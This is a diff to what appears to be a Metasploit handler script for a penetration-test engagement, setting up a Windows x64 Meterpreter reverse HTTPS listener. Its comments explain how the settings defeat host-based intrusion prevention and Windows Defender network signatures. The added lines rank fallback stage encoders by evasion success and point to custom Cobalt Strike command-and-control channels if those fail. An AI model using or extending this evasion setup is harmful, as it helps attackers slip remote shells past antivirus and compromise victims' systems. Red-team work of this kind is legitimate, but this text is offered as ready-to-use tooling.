@@ -3,14 +3,23 @@
 #
 # Rationale:
 #   HandlerSSLCert         — self-signed cert mimicking a benign domain,
-#                            defeats host-based IPS certificate signatures
-#                            (Mod 14.3.1).
+#                            defeats host-based IPS certificate signatures.
 #   EnableStageEncoding    — defeats network-traffic signatures on the
 #   StageEncoder           — default Meterpreter second stage. Windows
-#                            Defender's WdNisSvc inspects network traffic
-#                            against signatures; this is what stops it.
-#   ExitOnSession false    — catch multiple shells across the engagement
-#                            without restarting the handler.
+#                            Defender's WdNisSvc inspects network traffic.
+#   ExitOnSession false    — catch multiple shells across the engagement.
+#
+# If the default stage encoder is signatured on your target, swap
+# StageEncoder to one of the fallbacks below. Reorder by preference.
+#
+# Fallback stage encoders (most effective first):
+#   x64/zutto_dekiru     — polymorphic, high success rate
+#   x64/xor_dynamic      — dynamic XOR, simpler but usually clean
+#   x64/xor              — static XOR, last resort
+#
+# If ALL stage encoders trip WdNisSvc, swap the payload for a custom C2
+# channel (Cobalt Strike malleable profile, custom HTTPS beacon). See
+# HARDENED.md.
 
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_https
